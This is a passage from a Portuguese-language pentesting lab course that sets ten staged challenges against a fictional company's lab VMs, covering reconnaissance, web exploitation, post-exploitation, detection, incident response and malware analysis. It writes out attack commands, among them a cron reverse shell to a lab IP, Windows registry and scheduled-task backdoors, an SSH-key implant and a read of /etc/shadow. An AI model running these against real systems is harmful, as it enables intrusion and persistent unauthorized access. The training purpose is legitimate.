# Parte 13 — 10 desafios práticos: a empresa "CorpLab S.A."

Aqui os exercícios ganham enredo. Imagine que você foi contratado como pentester pela **CorpLab S.A.**, uma pequena empresa de tecnologia. Os sistemas dela são as VMs do seu lab, e cada desafio é um módulo da avaliação — do reconhecimento inicial até a resposta a incidente e a análise de malware. Faça na ordem: cada desafio prepara o terreno para o próximo.

## 🔍 Desafio 1 — Reconhecimento
**Nível:** 🟢 Iniciante · **Alvo:** `192.168.200.0/24` · **Ferramentas:** Nmap, Netdiscover, ARP-scan

Mapeie toda a infraestrutura sem disparar alertas óbvios.
```bash
netdiscover -r 192.168.200.0/24                  # host discovery passivo
nmap -sn 192.168.200.0/24                         # confirmar hosts ativos
nmap -sS -sV -O -T3 192.168.200.0/24              # serviços e OS
nmap -sC -sV -p- [IP]                             # scan completo por host
```
Monte uma tabela: `IP | Hostname | OS | Portas | Serviços | Versões`.

## 📋 Desafio 2 — Enumeração profunda
**Nível:** 🟢 Iniciante · **Alvo:** MSF3 Linux (.10) e DVWA (.30) · **Ferramentas:** Enum4linux-ng, Gobuster, Nikto, WhatWeb

```bash
enum4linux-ng -A 192.168.200.10                   # usuários, shares, políticas de senha
gobuster dir -u http://192.168.200.30 -w SecLists/common.txt -x php,html
nikto -h http://192.168.200.30 -o resultado.html -Format html
whatweb http://192.168.200.30                      # CMS, servidor, versões
```
Monte uma lista de usuários e possíveis senhas para os ataques de credencial.

## 💥 Desafio 3 — Exploração web
**Nível:** 🟡 Intermediário · **Alvo:** DVWA (.30), todos os módulos · **Ferramentas:** Burp Suite, SQLmap, browser

1. **SQLi:** extraia o banco completo com SQLmap → quebre os hashes com a RTX 4060.
2. **XSS Refletido:** roube o cookie de sessão do admin.
3. **XSS Armazenado:** injete script que persiste para todos os visitantes.
4. **File Upload:** carregue uma webshell PHP e obtenha execução de comandos.
5. **Command Injection:** execute `id` via campo de entrada.
6. Documente cada falha: payload, evidência (URL/request) e mitigação.

## 🏴‍☠️ Desafio 4 — Pós-exploração Linux
**Nível:** 🟡 Intermediário · **Alvo:** Metasploitable3 Linux (.10) · **Ferramentas:** Metasploit, LinPEAS, GTFOBins

```bash
# 1. Obtenha shell via Metasploit (use vulnerabilidade do Desafio 1)
whoami; id; uname -a; ip addr; cat /etc/os-release
# 2. Rode o LinPEAS e leia as seções vermelha e amarela com atenção
# 3. Identifique um vetor: SUID, sudo, cron, capabilities, kernel
# 4. Escale para root e prove:
whoami && id && cat /etc/shadow
# 5. Instale persistência via cron job e SSH key
```

## 🔗 Desafio 5 — Persistência
**Nível:** 🟡 Intermediário · **Alvo:** MSF3 Linux (.10) e MSF3 Windows (.20)

**Linux:**
```bash
# SSH key
ssh-keygen -t ed25519 -f lab_key -N ''
cat lab_key.pub >> /root/.ssh/authorized_keys

# Cron job reverse shell (@reboot)
(crontab -l; echo '@reboot /bin/bash -i >& /dev/tcp/192.168.100.100/4444 0>&1') | crontab
# Reinicie → nc -lvnp 4444 no Kali → recebe o shell automaticamente
```
**Windows:**
```bat
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d C:\shell.exe /f
schtasks /create /tn evil /tr C:\shell.exe /sc onlogon /ru SYSTEM /f
:: Reinicie e confirme o callback
```

## 🛡️ Desafio 6 — Blue Team: detectar o ataque
**Nível:** 🟡 Intermediário · **Alvo:** Wazuh Dashboard + logs de todos os sistemas

1. No Wazuh, filtre os alertas pelo período dos Desafios 1–5.
2. Identifique o momento exato do Nmap scan nos logs do Suricata.
3. Localize a exploração: qual porta, qual módulo MSF, qual payload.
4. Encontre a escalada de privilégios nos event logs do Linux.
5. Encontre o mecanismo de persistência instalado.
6. Crie uma regra Suricata para detectar o LinPEAS na próxima vez.
7. Produza a timeline: `HH:MM:SS | Evento | Ferramenta detectou | Evidência`.

## 🚨 Desafio 7 — Resposta a incidente
**Nível:** 🔴 Avançado · **Cenário:** alerta de múltiplos logins falhos + um login bem-sucedido · **Ferramentas:** Wazuh, Volatility, Autopsy, TheHive

Siga o NIST SP 800-61:
1. **Detecção:** qual IP de origem? Qual conta? Qual EventID? Horário?
2. **Triagem:** o login é legítimo? Verifique horário, IP e comportamento pós-login.
3. **Contenção:** snapshot da VM comprometida + isolamento da TargetNET.
4. **Análise de RAM:** dump com WinPMEM → Volatility → processos e conexões suspeitas.
5. **Análise de disco:** Autopsy → arquivos recentes, prefetch, timeline.
6. **Erradicação:** remova o backdoor, redefina credenciais, aplique patch.
7. **Recuperação:** restaure de snapshot limpo e monitore por 24h.
8. **Relatório:** timeline, IOCs (IPs, hashes, paths), causa raiz e recomendações.

## 🦠 Desafio 8 — Análise de malware
**Nível:** 🔴 Avançado · **Sample:** crie com msfvenom OU baixe do MalwareBazaar · **Ferramentas:** REMnux e Flare-VM

**Estática (REMnux):**
```bash
sha256sum malware.exe                              # hash → pesquise no VirusTotal
strings -n 8 malware.exe | grep -iE 'http|cmd|pass|192\.'
floss malware.exe                                  # strings deobfuscadas
die malware.exe                                    # identificar packer
readpe --imports malware.exe                       # imports suspeitos
```
**Dinâmica (Flare-VM — rede MalNET):**
1. Regshot → snapshot **antes** da execução.
2. Procmon filtrando por `Process Name = malware.exe`.
3. Wireshark capturando na interface da MalNET.
4. Execute o malware → aguarde 60 segundos.
5. Regshot → snapshot **depois** → compare → o que mudou?
6. Analise o Wireshark: tentativas de conexão C2? Qual IP/domínio?

## ⚙️ Desafio 9 — Engenharia reversa
**Nível:** 🔴 Avançado · **Target:** crackme do Crackmes.one (rating 1.0–2.0) · **Ferramentas:** Ghidra, GDB+pwndbg, ltrace, strace, strings

```bash
./crackme                        # entenda o que ele pede (senha? serial?)
ltrace ./crackme teste           # capture strcmp() / strncmp()
strace ./crackme                 # observe syscalls (leitura de arquivo?)
# Ghidra → main() → encontre a lógica de verificação no decompiler
# GDB: break main → r → ni até a comparação → x/s $rdi
./crackme [senha]                # valide a senha/serial encontrada
```
- [Crackmes.one](https://crackmes.one) · comece pelos rating 1.0
- [LiveOverflow RE Playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

## 🔐 Desafio 10 — Criptografia e hashes
**Nível:** 🟡 → 🔴 · **Ferramentas:** CyberChef, Hashcat GPU, John, RsaCtfTool, OpenSSL

```
# Nível 1 — identifique e decodifique (use o CyberChef)
SGVsbG8gV29ybGQ=                          # Base64
48656c6c6f20576f726c64                    # Hex
Uryyb Jbeyq                               # ROT13
```
```bash
# Nível 2 — identifique e quebre com a RTX 4060
# 5f4dcc3b5aa765d61d8327deb882cf99          (tipo? senha?)
# aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d  (tipo? senha?)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Nível 3 — RSA fraco
openssl genrsa -out privkey.pem 512
openssl rsa -in privkey.pem -pubout -out pubkey.pem
python3 RsaCtfTool.py --publickey pubkey.pem --private
```
📖 [CryptoHack Challenges](https://cryptohack.org/challenges)

---

⏮️ Anterior: **[Parte 12 — Exercícios progressivos](12-exercicios-progressivos.md)** · ⏭️ Próximo: **[Parte 14 — Recursos e links](14-recursos-e-links.md)** · [↩︎ Índice](../README.md)
